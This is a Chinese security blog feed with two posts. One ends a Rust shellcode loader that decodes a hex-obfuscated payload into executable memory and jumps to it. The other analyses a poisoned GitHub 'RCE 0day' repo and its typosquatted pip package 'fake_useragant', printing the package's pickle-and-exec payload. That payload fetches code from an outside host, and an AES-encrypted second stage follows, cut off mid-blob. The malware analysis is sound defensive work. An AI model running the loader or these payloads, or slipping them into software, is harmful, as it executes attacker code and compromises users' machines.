class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(pattern)]</span><br><br><span class="hljs-comment">// #![windows_subsystem = &quot;windows&quot;]</span><br><span class="hljs-keyword">use</span> bindings::windows::win32::system_services::VirtualAlloc;<br><span class="hljs-keyword">use</span> std::arch::asm;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br><span class="hljs-comment">//经过hex加密</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">contents2</span> = <span class="hljs-keyword">match</span> std::fs::<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-string">&quot;calc64.raw&quot;</span>) &#123;<br><span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br><span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;加密后: &#123;:?&#125;&quot;</span>,contents2);<br><br><br><span class="hljs-comment">//ascii 转换</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">s</span> = <span class="hljs-keyword">match</span>  std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(&amp;contents2)&#123;<br><span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br><span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;ascii转换后contents2:&#123;:?&#125;&quot;</span>,s);<br><br><span class="hljs-comment">//hex 解密</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">decode_s</span> = <span class="hljs-keyword">match</span> hex::<span class="hljs-title function_ invoke__">decode</span>(s)&#123;<br><span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br><span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;第一轮hex解密：&#123;:?&#125;&quot;</span>,decode_s);<br><br><span class="hljs-comment">//将第一轮解密后的数据进行ASCII解密</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">de_s</span> = <span class="hljs-keyword">match</span>  std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(&amp;decode_s)&#123;<br><span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br><span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">de_s</span> = de_s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">let</span> <span class="hljs-variable">de_s</span> = de_s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;第二轮ascii转换：&#123;:?&#125;&quot;</span>,de_s);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,de_s);<br><br><span class="hljs-comment">//第二轮 hex 解密</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">decode2_s</span> = <span class="hljs-keyword">match</span> hex::<span class="hljs-title function_ invoke__">decode</span>(de_s) &#123;<br><span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br><span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,decode2_s);<br><br><span class="hljs-keyword">let</span> <span class="hljs-variable">flen</span> = decode2_s.<span class="hljs-title function_ invoke__">len</span>();<br><span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf</span> = <span class="hljs-keyword">unsafe</span> &#123;<br><span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>flen,<br>MEM_COMMIT | MEM_RESERVE,<br>PAGE_EXECUTE_READWRITE,<br>)<br>&#125;;<br><span class="hljs-keyword">if</span> new_buf == std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>()&#123;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Failed to allocate memory&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf_ptr</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> = new_buf <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> <span class="hljs-keyword">as</span> _;<br><span class="hljs-keyword">unsafe</span> &#123;std::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(decode2_s.<span class="hljs-title function_ invoke__">as_ptr</span>(), new_buf_ptr, flen)&#125;;<br><br><span class="hljs-built_in">println!</span>(<br><span class="hljs-string">&quot;[*] Starting jmp to shellcode at offset 0x (base virtual address: &#123;:p&#125;)&quot;</span>,<br>new_buf_ptr<br>);<br><br><span class="hljs-keyword">unsafe</span> &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">jmp_target</span> = new_buf_ptr;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,jmp_target);<br><br>asm!(<span class="hljs-string">&quot;jmp &#123;&#125;&quot;</span>,<span class="hljs-title function_ invoke__">in</span>(reg) jmp_target)<br>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[package]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;rs_shellcode&quot;</span><br><span class="hljs-attr">version</span> = <span class="hljs-string">&quot;0.1.0&quot;</span><br><span class="hljs-attr">authors</span> = [<span class="hljs-string">&quot;b1tg &lt;b1tg@users.noreply.github.com&gt;&quot;</span>]<br><span class="hljs-attr">edition</span> = <span class="hljs-string">&quot;2018&quot;</span><br><br><span class="hljs-comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><br><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">bindings</span> = &#123; package = <span class="hljs-string">&quot;rs_shellcode_bindings&quot;</span>, path = <span class="hljs-string">&quot;bindings&quot;</span> &#125;<br><span class="hljs-attr">clap</span> = <span class="hljs-string">&quot;3.0.0-beta.2&quot;</span><br><span class="hljs-attr">hex</span> = <span class="hljs-string">&quot;0.4.3&quot;</span><br></code></pre></td></tr></table></figure><p><strong>编译</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cargo build</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天擎Github投毒分析</title>
    <link href="/2022/08/04/360tianqingRCE%E5%88%86%E6%9E%90/"/>
    <url>/2022/08/04/360tianqingRCE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在周一早上发现有人讨论HW投毒项目，在微步发现连接以及简单分析</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658908565938-e6820007-bfd5-4091-8f6c-04d5988761a8.png" alt="image.png"><br><a href="https://github.com/FuckRedTeam/360tianqingRCE">https://github.com/FuckRedTeam/360tianqingRCE</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658908670213-457dc22a-a1ff-4f96-a222-29d71d21ff96.png" alt="image.png"></p><p>可以看到这是 360天擎的RCE 0day，作者名字 FuckRedTeam，才注册的新号。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658908768353-b01001ed-f407-4bcb-ba78-2bc5f5d4db03.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658908848686-6d543945-0493-4cee-976c-96282984c402.png" alt="image.png"><br>可以看到引入了<code>fake_useragant</code>，正常来说应该是 <code>fake_useragent</code><br>将<code>agent</code>修改为了<code>agant</code>，其中<code>fake_useragant</code>为恶意pip包</p><p>在国内源下载下来，解压分析<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658909047838-ce8f7b7a-ee17-4092-823a-9e9f199ebf7b.png" alt="image.png"></p><meta name="referrer" content="no-referrer" /><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="base64-de"><a href="#base64-de" class="headerlink" title="base64_de"></a>base64_de</h3><p>urllib2是他自己写的，这里有一段base64代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">base64.decodebytes(<span class="hljs-string">b&#x27;gASVpwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIyLaHRtbD11cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vaS5taWFvc3UuYmlkL2RhdGEvZl8zNTQ2MTM1NC5wbmcnKS5yZWFkKClbNzpdCmpzb24ubG9hZHMoYmFzZTY0LmRlY29kZWJ5dGVzKGh0bWxbOi0zXVs6Oi0xXStodG1sWy0zOl0pKZSFlFKULg==&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">builtinsexechtml=urllib.request.urlopen(<span class="hljs-string">&#x27;http://i.miaosu.bid/data/f_35461354.png&#x27;</span>).read()[<span class="hljs-number">7</span>:]<br>json.loads(base64.decodebytes(html[:-<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>]+html[-<span class="hljs-number">3</span>:]))R.<br></code></pre></td></tr></table></figure><p>访问<a href="http://i.miaosu.bid/data/f_35461354.png">http://i.miaosu.bid/data/f_35461354.png</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658737841581-dcaf96c6-558a-4e95-a197-9130b6fbf7fb.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658909227632-0703bed0-907b-4605-afcf-9d7957e97f82.png" alt="image.png"><br>是一个图床</p><h3 id="base64-de-1"><a href="#base64-de-1" class="headerlink" title="base64_de"></a>base64_de</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">base64.decodebytes(html[:-<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>]+html[-<span class="hljs-number">3</span>:])<br></code></pre></td></tr></table></figure><p>访问图片，读取指定位置，对html筛选后的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解密html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;\x80\x04\x95\xf9I\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94X\xdaI\x00\x00json.loads(base64.decodebytes(AES.new(b&#x27;0c6TYJwXPNbfRaW8D9jLtVSqO1nvZzo=&#x27;,AES.MODE_CBC,b&#x27;9ZpA87xH3J1k5ylK&#x27;).decrypt(base64.decodebytes(b&#x27;&#x27;+b&#x27;=&#x27;*(len(b&#x27;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